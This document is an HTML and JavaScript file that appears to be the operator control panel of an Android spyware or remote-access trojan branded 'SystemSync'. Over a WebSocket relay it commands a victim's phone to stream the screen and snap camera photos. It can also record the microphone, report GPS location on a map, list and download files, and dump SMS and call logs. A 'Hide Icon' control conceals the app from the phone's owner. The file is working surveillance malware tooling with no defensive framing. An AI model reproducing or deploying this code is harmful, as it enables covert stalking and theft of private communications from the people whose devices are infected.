<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ===== GLOBAL ===== */
        body{
            margin:0;
            background:#f5f7fa;  /* light professional background */
            font-family: 'Segoe UI', system-ui, sans-serif;
            display:flex;
            height:100vh;
            overflow:hidden;
        }

        /* ===== SIDEBAR ===== */
        #sidebar{
            width:280px;
            background:white;
            border-right:1px solid #e0e4e8;
            padding:20px;
            overflow-y:auto;
            box-shadow:2px 0 5px rgba(0,0,0,0.02);
        }
/* Location info overlay on map */
.map-info {
    position: absolute;
    top: 10px;
    left: 10px;
    background: rgba(255,255,255,0.6);
    padding: 8px 12px;
    border-radius: 8px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    font-size: 13px;
    color: #1a2634;
    z-index: 1000;
    pointer-events: none;
    border-left: 4px solid #1976ff;
}
.map-info div {
    margin: 2px 0;
}
.map-info .coord {
    font-weight: 600;
}
.map-info .addr {
    color: #2c3e50;
    font-style: italic;
}
        .logo{
            font-size:20px;
            font-weight:600;
            color:#1976ff;
            margin-bottom:30px;
        }

        .section{
            margin-bottom:25px;
        }

        .section-title{
            font-size:12px;
            font-weight:600;
            color:#7b8a9b;
            text-transform:uppercase;
            letter-spacing:0.5px;
            margin-bottom:12px;
        }

        button{
            width:100%;
            padding:10px 12px;
            margin:4px 0;
            background:white;
            color:#1a2634;
            border:1px solid #d0d9e2;
            border-radius:8px;
            font-size:14px;
            text-align:left;
            cursor:pointer;
            transition:0.2s;
            display:flex;
            align-items:center;
            gap:8px;
        }

        button:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* ===== MAIN PANEL ===== */
        #main{
            flex:1;
            display:flex;
            flex-direction:column;
            min-width:0;
            background:#f5f7fa;
        }

        #header{
            height:60px;
            background:white;
            border-bottom:1px solid #e0e4e8;
            display:flex;
            align-items:center;
            justify-content:space-between;
            padding:0 25px;
            font-weight:600;
            color:#1a2634;
        }

        #status{
            padding:6px 16px;
            border-radius:30px;
            background:#e8f0fe;
            color:#1976ff;
            font-weight:500;
        }

        #content{
            flex:1;
            padding:20px;
            overflow:auto;
        }

        /* SINGLE CONTENT PANEL */
        #main-panel{
            background:white;
            border-radius:12px;
            box-shadow:0 2px 8px rgba(0,0,0,0.05);
            padding:20px;
            min-height:100%;
        }

        /* ===== MAP ===== */
        #map{
            height:400px;
            border-radius:10px;
        }

        /* ===== TABLES ===== */
        table{
            width:100%;
            border-collapse:collapse;
            font-size:14px;
        }
        th{
            background:#f8fafd;
            color:#1a2634;
            font-weight:600;
            padding:12px 10px;
            text-align:left;
            border-bottom:2px solid #e0e4e8;
        }
        td{
            padding:10px;
            border-bottom:1px solid #eef2f5;
            color:#2c3e50;
            word-break:break-word;
        }
        tr:hover{
            background:#f5f9ff;
        }

        /* ===== FILE EXPLORER ===== */
        .file-item{
            display:flex;
            align-items:center;
            padding:10px 12px;
            border-bottom:1px solid #eef2f5;
            cursor:pointer;
            gap:10px;
        }
        .file-item:hover{
            background:#f5f9ff;
        }
        .file-icon{
            font-size:18px;
            width:24px;
            text-align:center;
        }
        .file-name{
            flex:1;
            color:#1a2634;
        }
        .file-size{
            color:#7b8a9b;
            font-size:13px;
            margin-right:15px;
        }

        /* ===== PAGINATION ===== */
        .pagination{
            margin-top:20px;
            display:flex;
            gap:8px;
            justify-content:center;
        }
        .page-btn{
            padding:6px 12px;
            border:1px solid #d0d9e2;
            background:white;
            border-radius:6px;
            cursor:pointer;
            color:#1a2634;
        }
        .page-btn:hover{
            background:#1976ff;
            color:white;
            border-color:#1976ff;
        }

        /* ===== IMAGES & VIDEO ===== */
        img, video{
            max-width:100%;
            max-height:70vh;
            border-radius:8px;
            display:block;
            margin:0 auto;
        }

        /* ===== AUDIO PLAYER ===== */
        audio{
            width:100%;
            margin-top:15px;
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button onclick="toggleScreen()"><span>üñ•</span> <span id="screenBtn">Start Screen</span></button>
        <button onclick="toggleFrontCam()"><span>üì∑</span> <span id="frontCamBtn">Front Camera</span></button>
        <button onclick="toggleBackCam()"><span>üì∑</span> <span id="backCamBtn">Back Camera</span></button>
        <button onclick="toggleMic()"><span>üé§</span> <span id="micBtn">Start Mic</span></button>
        <button onclick="send('getLocation')"><span>üìç</span> GPS Location</button>
    </div>

    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="send('ls root')"><span>üìÇ</span> File Manager</button>
        <button onclick="send('getSMS inbox')"><span>üí¨</span> SMS Logs</button>
        <button onclick="send('getCallLogs')"><span>üìû</span> Call Logs</button>
    </div>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>üëª</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="send('vibrate 1000')"><span>üì≥</span> Vibrate (1s)</button>
    </div>
</div>

<div id="main">
    <div id="header">
        <div>Control Panel</div>
        <div id="status">CONNECTING</div>
    </div>
    <div id="content">
        <div id="main-panel">
            Ready.
        </div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- CONFIG ----------
    const WS_URL = "wss://mirror-view.onrender.com";

    // ---------- GLOBALS ----------
    let ws;
    let pc = null;                     // WebRTC peer
    let mapInstance = null;
    let currentData = [];               // for pagination
    let currentPage = 0;
    let dataType = null;                // 'sms', 'call', 'file'

    // Toggle states
    let screenActive = false;
    let frontCamActive = false;
    let backCamActive = false;
    let micActive = false;
    let iconHidden = false;

    const panel = document.getElementById('main-panel');

    // ---------- CONNECTION ----------
    function connect() {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => {
            console.log('Connected');
            ws.send("I_AM_WEB");
            setStatus("ONLINE");
        };
        ws.onmessage = (e) => {
            const msg = e.data;
            console.log('Received:', msg);

            // Status
            if (msg.startsWith("STATUS:")) {
                setStatus(msg.substring(7));
            }
            // GPS
            else if (msg.startsWith("LOC_DATA:")) {
                try {
                    const data = JSON.parse(msg.substring(9));
                    renderMap(data);
                } catch (err) {
                    console.error(err);
                }
            }
            // File list
            else if (msg.startsWith("FILE_LIST:")) {
                try {
                    currentData = JSON.parse(msg.substring(10));
                    dataType = 'file';
                    renderFiles();
                } catch (err) {
                    console.error(err);
                }
            }
            // SMS
            else if (msg.startsWith("SMS_DATA:")) {
                try {
                    currentData = JSON.parse(msg.substring(9));
                    dataType = 'sms';
                    renderTable();
                } catch (err) {
                    console.error(err);
                }
            }
            // Call logs
            else if (msg.startsWith("CALL_DATA:")) {
                try {
                    currentData = JSON.parse(msg.substring(10));
                    dataType = 'call';
                    renderTable();
                } catch (err) {
                    console.error(err);
                }
            }
            // Camera image
            else if (msg.startsWith("CAMERA_IMAGE:")) {
                const base64 = msg.substring(13);
                showImage(base64);
            }
            // Audio file
            else if (msg.startsWith("AUDIO_RECORDING:")) {
                const base64 = msg.substring(16);
                showAudio(base64);
            }
            else if (msg.startsWith("AUDIO_STARTED")) {
                micActive = true;
                document.getElementById('micBtn').innerText = 'Stop Mic';
                showNotification('Mic started');
            }
            else if (msg.startsWith("AUDIO_STOPPED")) {
                micActive = false;
                document.getElementById('micBtn').innerText = 'Start Mic';
                showNotification('Mic stopped');
            }
            // Screen share
            else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started');
            }
            else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (pc) { pc.close(); pc = null; }
                showNotification('Screen share stopped');
            }
            else if (msg.startsWith("RTC_OFFER:screen:")) {
                handleOffer(msg.substring(17));
            }
            else if (msg.startsWith("ICE_CANDIDATE:")) {
                handleIceCandidate(msg.substring(14));
            }
            // App icon
            else if (msg.startsWith("APP_HIDDEN")) {
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
            }
            else if (msg.startsWith("APP_SHOWN")) {
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
            }
            // Vibration
            else if (msg.startsWith("VIBRATE_DONE")) {
                showNotification('Vibration done');
            }
            // Error
            else if (msg.startsWith("ERROR:")) {
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
            }
        };
        ws.onclose = () => {
            setStatus('OFFLINE');
            setTimeout(connect, 5000);
        };
        ws.onerror = console.error;
    }

    function setStatus(s) {
        const el = document.getElementById('status');
        el.innerText = s;
        el.style.background = s === 'ONLINE' ? '#e8f5e9' : '#ffebee';
        el.style.color = s === 'ONLINE' ? '#2e7d32' : '#c62828';
    }

    // ---------- COMMAND ----------
    function send(cmd) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(cmd);
        } else {
            alert('Not connected');
        }
    }

    // ---------- TOGGLES ----------
    function toggleScreen() {
        if (screenActive) send('STOP_SCREEN_SHARE');
        else send('START_SCREEN_SHARE');
    }

    function toggleFrontCam() {
        if (frontCamActive) {
            frontCamActive = false;
            document.getElementById('frontCamBtn').innerText = 'Front Camera';
        } else {
            send('camFront');
            frontCamActive = true;
            document.getElementById('frontCamBtn').innerText = 'Stop Front';
            // Auto revert after 5s (camera stops after one shot)
            setTimeout(() => {
                if (frontCamActive) {
                    frontCamActive = false;
                    document.getElementById('frontCamBtn').innerText = 'Front Camera';
                }
            }, 5000);
        }
    }

    function toggleBackCam() {
        if (backCamActive) {
            backCamActive = false;
            document.getElementById('backCamBtn').innerText = 'Back Camera';
        } else {
            send('camBack');
            backCamActive = true;
            document.getElementById('backCamBtn').innerText = 'Stop Back';
            setTimeout(() => {
                if (backCamActive) {
                    backCamActive = false;
                    document.getElementById('backCamBtn').innerText = 'Back Camera';
                }
            }, 5000);
        }
    }

    function toggleMic() {
        if (micActive) send('stopAudio');
        else send('startAudio');
    }

    function toggleAppIcon() {
        if (iconHidden) send('showApp');
        else send('hideApp');
    }

    // ---------- RENDERERS ----------
    function showImage(base64) {
        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
    }

    function showAudio(base64) {
        panel.innerHTML = `
            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
            <button onclick="download('${base64}', 'recording.3gp')">Download</button>
        `;
    }

    function download(b64, name) {
        const a = document.createElement('a');
        a.href = 'data:application/octet-stream;base64,' + b64;
        a.download = name;
        a.click();
    }

   function renderMap(loc) {
    // Create map container with relative positioning for overlay
    panel.innerHTML = '<div id="map" style="position:relative;"></div>';
    const mapDiv = document.getElementById('map');

    // Create info overlay
    const infoDiv = document.createElement('div');
    infoDiv.className = 'map-info';
    infoDiv.innerHTML = `
        <div class="coord">üìç ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
        <div>üéØ Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
        <div>üì° Provider: ${loc.provider || 'unknown'}</div>
        <div class="addr">üåç Loading address...</div>
    `;
    mapDiv.appendChild(infoDiv);

    // Initialize map
    if (mapInstance) mapInstance.remove();
    mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
    L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);

    // Fetch human-readable address using Nominatim (OpenStreetMap)
    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
        headers: { 'User-Agent': 'SystemSync-Console/1.0' }  // Identify your app
    })
    .then(response => response.json())
    .then(data => {
        const address = data.display_name || 'Address not found';
        infoDiv.querySelector('.addr').innerHTML = `üåç ${address}`;
    })
    .catch(err => {
        console.error('Geocoding error:', err);
        infoDiv.querySelector('.addr').innerHTML = 'üåç Address unavailable';
    });
}

    // Table render with pagination
    function renderTable() {
        if (!currentData || currentData.length === 0) {
            panel.innerHTML = '<p>No data</p>';
            return;
        }

        // Prepare columns based on dataType
        let headers = [];
        let rows = [];

        if (dataType === 'sms') {
            headers = ['Type', 'Number', 'Message', 'Date'];
            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
        } else if (dataType === 'call') {
            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
            rows = currentData.map(item => [
                item.type,
                item.number,
                item.name || '',
                item.date,
                item.duration + 's'   // keep raw duration
            ]);
        } else {
            // fallback
            panel.innerHTML = '<p>Unknown data type</p>';
            return;
        }

        const pageSize = 17;
        const totalPages = Math.ceil(rows.length / pageSize);
        const start = currentPage * pageSize;
        const pageRows = rows.slice(start, start + pageSize);

        let html = '<table><thead><tr>';
        headers.forEach(h => html += `<th>${h}</th>`);
        html += '</tr></thead><tbody>';

        pageRows.forEach(r => {
            html += '<tr>';
            r.forEach(cell => html += `<td>${cell}</td>`);
            html += '</tr>';
        });
        html += '</tbody></table>';

        // Pagination
        if (totalPages > 1) {
            html += '<div class="pagination">';
            for (let i = 0; i < totalPages; i++) {
                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
            }
            html += '</div>';
        }

        panel.innerHTML = html;
    }

    function gotoPage(p) {
        currentPage = p;
        renderTable();
    }

    // File explorer
    function renderFiles() {
          if (!currentData || currentData.length === 0) {
        panel.innerHTML = '<p>No files found. Make sure storage permission is granted and the directory is not empty.</p>';
        return;
    }
        let html = '<div class="file-list">';
        currentData.forEach(f => {
            html += `
                <div class="file-item" onclick="handleFile('${f.path}', ${f.isDir})">
                    <span class="file-icon">${f.isDir ? 'üìÅ' : 'üìÑ'}</span>
                    <span class="file-name">${f.name}</span>
                    <span class="file-size">${f.isDir ? '' : formatBytes(f.size)}</span>
                </div>
            `;
        });
        html += '</div>';
        panel.innerHTML = html;
    }

    function handleFile(path, isDir) {
        if (isDir) send('ls ' + path);
        else send('dl ' + path);
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    // ---------- WEBRTC ----------
    function handleOffer(sdp) {
        if (!pc) {
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.ontrack = (e) => {
                panel.innerHTML = '<video autoplay playsinline></video>';
                document.querySelector('video').srcObject = e.streams[0];
            };
            pc.onicecandidate = (e) => {
                if (e.candidate) ws.send('ICE_CANDIDATE:' + JSON.stringify(e.candidate));
            };
        }
        pc.setRemoteDescription({ type: 'offer', sdp })
            .then(() => pc.createAnswer())
            .then(a => pc.setLocalDescription(a))
            .then(() => ws.send('ANSWER:' + pc.localDescription.sdp))
            .catch(console.error);
    }

    function handleIceCandidate(candidateStr) {
        if (!pc) return;
        try {
            pc.addIceCandidate(new RTCIceCandidate(JSON.parse(candidateStr)));
        } catch (e) { console.error(e); }
    }

    function showNotification(text) {
        const status = document.getElementById('status');
        const orig = status.innerText;
        status.innerText = text;
        setTimeout(() => { status.innerText = orig; }, 2000);
    }

    // ---------- START ----------
    connect();
</script>
</body>
</html>
